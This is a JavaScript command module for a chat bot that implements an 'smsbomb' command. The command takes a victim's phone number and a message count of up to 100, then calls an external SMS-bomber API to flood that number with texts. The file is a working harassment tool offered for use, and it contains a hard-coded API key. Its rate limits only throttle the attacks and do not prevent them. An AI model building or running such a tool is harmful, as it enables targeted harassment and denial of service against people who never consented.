const axios = require('axios');
const { sendMessage } = require('../handles/sendMessage');

// Cooldown storage (per user)
const userCooldowns = new Map();
const COOLDOWN_TIME = 180000; // 3 minutes

// Global rate limit tracking
const globalRateLimit = {
    count: 0,
    resetTime: Date.now() + 60000 // 1 minute
};

module.exports = {
    name: ['smsbomb', 'smsbomber', 'bomb'],
    usage: 'smsbomb [phone] | [amount]',
    description: 'Send SMS bomber to a phone number (3 minute cooldown)',
    version: '1.0.0',
    author: 'codex',
    category: 'tools',
    cooldown: 180,

    async execute(senderId, args, token, event) {
        // Check global rate limit
        const now = Date.now();
        if (now > globalRateLimit.resetTime) {
            globalRateLimit.count = 0;
            globalRateLimit.resetTime = now + 60000;
        }
        
        if (globalRateLimit.count >= 3) {
            const remainingSeconds = Math.ceil((globalRateLimit.resetTime - now) / 1000);
            await sendMessage(senderId, {
                text: `Global Rate Limit Reached\n\nPlease wait ${remainingSeconds} seconds before using this command again.\n\nThis is to prevent abuse of the SMS bombing service.`
            }, token);
            return;
        }

        // Check user cooldown
        const lastUsed = userCooldowns.get(senderId);
        if (lastUsed && (now - lastUsed) < COOLDOWN_TIME) {
            const remainingSeconds = Math.ceil((COOLDOWN_TIME - (now - lastUsed)) / 1000);
            const minutes = Math.floor(remainingSeconds / 60);
            const seconds = remainingSeconds % 60;
            
            let timeText = '';
            if (minutes > 0) {
                timeText = `${minutes} minute${minutes > 1 ? 's' : ''} and ${seconds} second${seconds > 1 ? 's' : ''}`;
            } else {
                timeText = `${seconds} second${seconds > 1 ? 's' : ''}`;
            }
            
            await sendMessage(senderId, {
                text: `Cooldown Active\n\nPlease wait ${timeText} before using this command again.\n\nCooldown Period: 3 minutes`
            }, token);
            return;
        }

        // Check if phone number and amount are provided
        if (args.length < 2) {
            await sendMessage(senderId, { 
                text: `SMS Bomber Tool\n\nUsage:\nsmsbomb [phone] | [amount]\n\nExample:\nsmsbomb 09123456789 | 10\n\nAmount Range: 1-100 messages\nCooldown: 3 minutes\nGlobal Limit: 3 requests per minute`
            }, token);
            return;
        }

        // Parse args with | separator
        let phone, amount;
        const separatorIndex = args.findIndex(arg => arg === '|');

        if (separatorIndex !== -1) {
            phone = args.slice(0, separatorIndex).join(' ');
            amount = parseInt(args[separatorIndex + 1]);
        } else {
            phone = args[0];
            amount = parseInt(args[1]);
        }

        const apiKey = '79d08d76a3deae3fae1c7637141db818ec02faf1e3597e302c4ed9e1d5211d89';

        // Validate phone number
        if (!phone || phone.length < 10) {
            await sendMessage(senderId, { text: 'Invalid phone number. Please provide a valid phone number.' }, token);
            return;
        }

        // Validate amount
        if (isNaN(amount) || amount < 1 || amount > 100) {
            await sendMessage(senderId, { text: 'Amount must be between 1 and 100' }, token);
            return;
        }

        // Increment global rate limit
        globalRateLimit.count++;

        await sendMessage(senderId, { text: `Starting SMS bombing to ${phone} with ${amount} messages...` }, token);

        try {
            const response = await axios.get('https://haji-mix-api.gleeze.com/api/smsbomber', {
                params: {
                    phone: phone,
                    amount: amount,
                    api_key: apiKey
                },
                timeout: 30000
            });

            console.log('Full API Response:', JSON.stringify(response.data, null, 2));

            let successCount = 0;
            let failedCount = 0;
            
            if (response.data) {
                // Extract success count
                if (response.data.success_count !== undefined) {
                    successCount = parseInt(response.data.success_count) || 0;
                } else if (response.data.sent !== undefined) {
                    successCount = parseInt(response.data.sent) || 0;
                } else if (response.data.total !== undefined) {
                    successCount = parseInt(response.data.total) || 0;
                } else if (response.data.count !== undefined) {
                    successCount = parseInt(response.data.count) || 0;
                } else if (response.data.success !== undefined) {
                    successCount = parseInt(response.data.success) || 0;
                } else if (response.data.message) {
                    const countMatch = response.data.message.match(/(\d+)/);
                    if (countMatch) {
                        successCount = parseInt(countMatch[1]) || amount;
                    } else {
                        successCount = amount;
                    }
                } else {
                    successCount = amount;
                }

                // Extract failed count
                if (response.data.failed_count !== undefined) {
                    failedCount = parseInt(response.data.failed_count) || 0;
                } else if (response.data.failed !== undefined) {
                    failedCount = parseInt(response.data.failed) || 0;
                }

                // Ensure successCount does not exceed amount
                if (successCount > amount) {
                    successCount = amount;
                }

                // Set user cooldown
                userCooldowns.set(senderId, Date.now());

                let message = `SMS Bombing Complete\n\n`;
                message += `Target: ${phone}\n`;
                message += `Requested: ${amount} messages\n`;
                message += `Sent Successfully: ${successCount}\n`;
                message += `Failed to Send: ${failedCount}\n`;

                if (successCount !== amount) {
                    message += `\nNote: Only ${successCount} out of ${amount} messages were sent.`;
                }

                message += `\n\nNext use available in 3 minutes\nGlobal Limit: ${globalRateLimit.count}/3 per minute`;

                await sendMessage(senderId, { text: message }, token);
                
                console.log(`SMS bomb: Requested ${amount}, Sent ${successCount}, Failed ${failedCount} to ${phone} by user ${senderId}`);
                
            } else {
                await sendMessage(senderId, { 
                    text: `Failed to Start SMS Bombing\n\nError: ${response.data?.message || 'Unknown error'}\n\nPlease check the phone number and try again later.`
                }, token);
            }
            
        } catch (error) {
            console.error('SMS Bomber Error:', error);
            
            let errorMessage = `Error Occurred\n\n`;
            
            if (error.response?.status === 429) {
                errorMessage += `Rate limit exceeded. Please wait a few minutes before trying again.\n\nThe SMS bombing service has a limit of 3 requests per minute.`;
            } else if (error.response?.status === 500) {
                errorMessage += `Server error. Please try again later.`;
            } else if (error.response?.status === 400) {
                errorMessage += `Invalid phone number or amount. Please check your input.`;
            } else if (error.code === 'ECONNABORTED') {
                errorMessage += `Connection timeout. The server is taking too long to respond.`;
            } else if (error.response) {
                errorMessage += `API Error: ${error.response.status}\nMessage: ${error.response.data?.message || 'Unknown error'}`;
            } else if (error.request) {
                errorMessage += `No response from API server. Please try again later.`;
            } else {
                errorMessage += `${error.message}`;
            }
            
            errorMessage += `\n\nPlease wait a few minutes and try again.\nExample: smsbomb 09123456789 | 10`;
            
            await sendMessage(senderId, { text: errorMessage }, token);
        }
    }
};

// Clean up cooldowns periodically
setInterval(() => {
    const now = Date.now();
    for (const [userId, timestamp] of userCooldowns) {
        if (now - timestamp > COOLDOWN_TIME) {
            userCooldowns.delete(userId);
        }
    }
}, 60000);
